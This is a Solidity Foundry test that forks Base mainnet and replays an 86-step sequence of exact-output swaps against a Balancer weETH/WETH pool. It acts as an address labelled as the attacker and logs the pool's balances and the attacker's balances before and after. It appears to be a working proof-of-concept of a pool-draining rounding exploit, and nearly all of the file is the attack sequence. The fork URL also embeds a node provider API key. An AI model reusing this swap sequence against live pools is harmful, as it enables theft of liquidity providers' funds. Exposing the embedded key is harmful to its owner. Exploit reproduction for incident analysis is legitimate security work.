// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IBalancerVault {
    enum SwapKind { GIVEN_IN, GIVEN_OUT }
    enum UserBalanceOpKind { DEPOSIT_INTERNAL, WITHDRAW_INTERNAL, TRANSFER_INTERNAL, TRANSFER_EXTERNAL }

    struct SingleSwap {
        bytes32 poolId;
        SwapKind kind;
        IAsset assetIn;
        IAsset assetOut;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    struct UserBalanceOp {
        UserBalanceOpKind kind;
        IAsset asset;
        uint256 amount;
        address sender;
        address payable recipient;
    }

    function swap(
        SingleSwap memory singleSwap,
        FundManagement memory funds,
        uint256 limit,
        uint256 deadline
    ) external payable returns (uint256);

    function getPoolTokens(bytes32 poolId)
        external view
        returns (
            IERC20[] memory tokens,
            uint256[] memory balances,
            uint256 lastChangeBlock
        );

    function manageUserBalance(UserBalanceOp[] memory ops) external payable;

    function getInternalBalance(address user, IERC20[] memory tokens)
        external view
        returns (uint256[] memory balances);
}

interface IAsset {}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function symbol() external view returns (string memory);
}

contract BalancerBaseWeEthWethPoolTest is Test {
    IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    // Base Network Pool: weETH/wETH
    bytes32 constant POOL_ID = 0xab99a3e856deb448ed99713dfce62f937e2d4d74000000000000000000000118;
    address constant BASE_WEETH_WETH_BPT = 0xaB99a3e856dEb448eD99713dfce62F937E2d4D74;
    address constant BASE_weETH = 0x04C0599Ae5A44757c0af6F9eC3b93da8976c150A;  // Index 0
    address constant BASE_WETH = 0x4200000000000000000000000000000000000006;   // Index 1
    address constant BASE_ATTACKER = 0x56e5Adab68b594B0c2aD6C112D94AE5aCA98A001;

    struct ExactSwapData {
        address tokenIn;
        address tokenOut;
        uint256 amount;
        uint256 expectedIn;
        uint8 indexIn;
        uint8 indexOut;
    }

    function testBaseWeEthWethPool() public {
        vm.createSelectFork(
            "https://greatest-prettiest-shard.base-mainnet.quiknode.pro/b88e7d9ece3886528f7341abb3eabffa655fdc9c",
            37683327
        );

        (, uint256[] memory initialBalances,) = VAULT.getPoolTokens(POOL_ID);

        console.log("INITIAL STATE:");
        console.log("weETH (index 0):", initialBalances[0] / 1e18, "ETH");
        console.log("WETH (index 1):", initialBalances[1] / 1e18, "ETH");
        console.log("BPT (index 2):", initialBalances[2]);

        // Fund attacker with BPT directly for exact swaps
        deal(BASE_WEETH_WETH_BPT, BASE_ATTACKER, 10000 ether);

        vm.startPrank(BASE_ATTACKER);
        IERC20(BASE_WEETH_WETH_BPT).approve(address(VAULT), type(uint256).max);
        IERC20(BASE_weETH).approve(address(VAULT), type(uint256).max);
        IERC20(BASE_WETH).approve(address(VAULT), type(uint256).max);

        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: BASE_ATTACKER,
            fromInternalBalance: true,
            recipient: payable(BASE_ATTACKER),
            toInternalBalance: true
        });

        ExactSwapData[86] memory swaps;
        swaps[0] = ExactSwapData({ tokenIn: BASE_WEETH_WETH_BPT, tokenOut: BASE_weETH, amount: 59173949530711099, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[1] = ExactSwapData({ tokenIn: BASE_WEETH_WETH_BPT, tokenOut: BASE_WETH, amount: 77836752208061728, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[2] = ExactSwapData({ tokenIn: BASE_WEETH_WETH_BPT, tokenOut: BASE_weETH, amount: 591739495307111, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[3] = ExactSwapData({ tokenIn: BASE_WEETH_WETH_BPT, tokenOut: BASE_WETH, amount: 778367522080617, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[4] = ExactSwapData({ tokenIn: BASE_WEETH_WETH_BPT, tokenOut: BASE_weETH, amount: 5917394953071, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[5] = ExactSwapData({ tokenIn: BASE_WEETH_WETH_BPT, tokenOut: BASE_WETH, amount: 7783675220806, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[6] = ExactSwapData({ tokenIn: BASE_WEETH_WETH_BPT, tokenOut: BASE_weETH, amount: 59173949531, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[7] = ExactSwapData({ tokenIn: BASE_WEETH_WETH_BPT, tokenOut: BASE_WETH, amount: 77836752208, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[8] = ExactSwapData({ tokenIn: BASE_WEETH_WETH_BPT, tokenOut: BASE_weETH, amount: 591739495, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[9] = ExactSwapData({ tokenIn: BASE_WEETH_WETH_BPT, tokenOut: BASE_WETH, amount: 778367522, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[10] = ExactSwapData({ tokenIn: BASE_WEETH_WETH_BPT, tokenOut: BASE_weETH, amount: 5917395, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[11] = ExactSwapData({ tokenIn: BASE_WEETH_WETH_BPT, tokenOut: BASE_WETH, amount: 7783676, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[12] = ExactSwapData({ tokenIn: BASE_WEETH_WETH_BPT, tokenOut: BASE_weETH, amount: 59174, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[13] = ExactSwapData({ tokenIn: BASE_WEETH_WETH_BPT, tokenOut: BASE_WETH, amount: 77836, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[14] = ExactSwapData({ tokenIn: BASE_WEETH_WETH_BPT, tokenOut: BASE_weETH, amount: 592, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[15] = ExactSwapData({ tokenIn: BASE_WEETH_WETH_BPT, tokenOut: BASE_WETH, amount: 779, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[16] = ExactSwapData({ tokenIn: BASE_WEETH_WETH_BPT, tokenOut: BASE_weETH, amount: 6, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[17] = ExactSwapData({ tokenIn: BASE_WEETH_WETH_BPT, tokenOut: BASE_WETH, amount: 8, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[18] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 9999999987, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[19] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 12, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[20] = ExactSwapData({ tokenIn: BASE_weETH, tokenOut: BASE_WETH, amount: 31000000000000, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[21] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 25470, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[22] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 12, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[23] = ExactSwapData({ tokenIn: BASE_weETH, tokenOut: BASE_WETH, amount: 22000000000000, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[24] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 47604, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[25] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 12, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[26] = ExactSwapData({ tokenIn: BASE_weETH, tokenOut: BASE_WETH, amount: 15000000000000, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[27] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 326, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[28] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 12, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[29] = ExactSwapData({ tokenIn: BASE_weETH, tokenOut: BASE_WETH, amount: 11000000000000, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[30] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 1683, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[31] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 12, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[32] = ExactSwapData({ tokenIn: BASE_weETH, tokenOut: BASE_WETH, amount: 7900000000000, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[33] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 6542, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[34] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 12, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[35] = ExactSwapData({ tokenIn: BASE_weETH, tokenOut: BASE_WETH, amount: 5500000000000, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[36] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 1000638, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[37] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 12, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[38] = ExactSwapData({ tokenIn: BASE_weETH, tokenOut: BASE_WETH, amount: 4000000000000, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[39] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 5253, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[40] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 12, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[41] = ExactSwapData({ tokenIn: BASE_weETH, tokenOut: BASE_WETH, amount: 2800000000000, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[42] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 1175, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[43] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 12, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[44] = ExactSwapData({ tokenIn: BASE_weETH, tokenOut: BASE_WETH, amount: 2000000000000, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[45] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 1779, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[46] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 12, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[47] = ExactSwapData({ tokenIn: BASE_weETH, tokenOut: BASE_WETH, amount: 1400000000000, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[48] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 531, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[49] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 12, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[50] = ExactSwapData({ tokenIn: BASE_weETH, tokenOut: BASE_WETH, amount: 1000000000000, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[51] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 688, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[52] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 12, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[53] = ExactSwapData({ tokenIn: BASE_weETH, tokenOut: BASE_WETH, amount: 666000000000, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[54] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 84, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[55] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 12, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[56] = ExactSwapData({ tokenIn: BASE_weETH, tokenOut: BASE_WETH, amount: 477000000000, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[57] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 84, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[58] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 12, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[59] = ExactSwapData({ tokenIn: BASE_weETH, tokenOut: BASE_WETH, amount: 370000000000, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[60] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 1530, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[61] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 12, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[62] = ExactSwapData({ tokenIn: BASE_weETH, tokenOut: BASE_WETH, amount: 243000000000, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[63] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 85, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[64] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 12, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[65] = ExactSwapData({ tokenIn: BASE_weETH, tokenOut: BASE_WETH, amount: 190000000000, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[66] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 2707, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[67] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 12, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[68] = ExactSwapData({ tokenIn: BASE_weETH, tokenOut: BASE_WETH, amount: 130000000000, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[69] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 206, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[70] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 12, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[71] = ExactSwapData({ tokenIn: BASE_weETH, tokenOut: BASE_WETH, amount: 99000000000, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[72] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 46727, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[73] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 12, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[74] = ExactSwapData({ tokenIn: BASE_weETH, tokenOut: BASE_WETH, amount: 72000000000, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[75] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 65054312, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[76] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_weETH, amount: 12, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[77] = ExactSwapData({ tokenIn: BASE_weETH, tokenOut: BASE_WETH, amount: 51000000000, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[78] = ExactSwapData({ tokenIn: BASE_weETH, tokenOut: BASE_WEETH_WETH_BPT, amount: 10000, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[79] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_WEETH_WETH_BPT, amount: 10000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[80] = ExactSwapData({ tokenIn: BASE_weETH, tokenOut: BASE_WEETH_WETH_BPT, amount: 10000000000, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[81] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_WEETH_WETH_BPT, amount: 10000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[82] = ExactSwapData({ tokenIn: BASE_weETH, tokenOut: BASE_WEETH_WETH_BPT, amount: 10000000000000000, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[83] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_WEETH_WETH_BPT, amount: 10000000000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[84] = ExactSwapData({ tokenIn: BASE_weETH, tokenOut: BASE_WEETH_WETH_BPT, amount: 996702801275239568, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[85] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_WEETH_WETH_BPT, amount: 996702801275239568, expectedIn: 0, indexIn: 1, indexOut: 2 });

        console.log("Total swaps:", swaps.length);

        uint256 successCount = 0;

        for (uint i = 0; i < swaps.length; i++) {
            IBalancerVault.SingleSwap memory swap = IBalancerVault.SingleSwap({
                poolId: POOL_ID,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(swaps[i].tokenIn),
                assetOut: IAsset(swaps[i].tokenOut),
                amount: swaps[i].amount,
                userData: ""
            });

            try VAULT.swap(swap, funds, type(uint256).max, block.timestamp + 3600) returns (uint256) {
                successCount++;
            } catch {
                // Continue on failure
            }
        }

        console.log("Swaps executed:", successCount);

        vm.stopPrank();

        (, uint256[] memory finalBalances,) = VAULT.getPoolTokens(POOL_ID);

        console.log("FINAL STATE:");
        console.log("weETH (index 0):", finalBalances[0] / 1e18, "ETH");
        console.log("WETH (index 1):", finalBalances[1] / 1e18, "ETH");
        console.log("BPT (index 2):", finalBalances[2]);

        console.log("ATTACKER BALANCES:");
        console.log("BPT:", IERC20(BASE_WEETH_WETH_BPT).balanceOf(BASE_ATTACKER) / 1e18, "ETH");
        console.log("weETH:", IERC20(BASE_weETH).balanceOf(BASE_ATTACKER) / 1e18, "ETH");
        console.log("WETH:", IERC20(BASE_WETH).balanceOf(BASE_ATTACKER) / 1e18, "ETH");

        console.log("Total swaps executed:", successCount);
        console.log("SUCCESS!");
    }
}
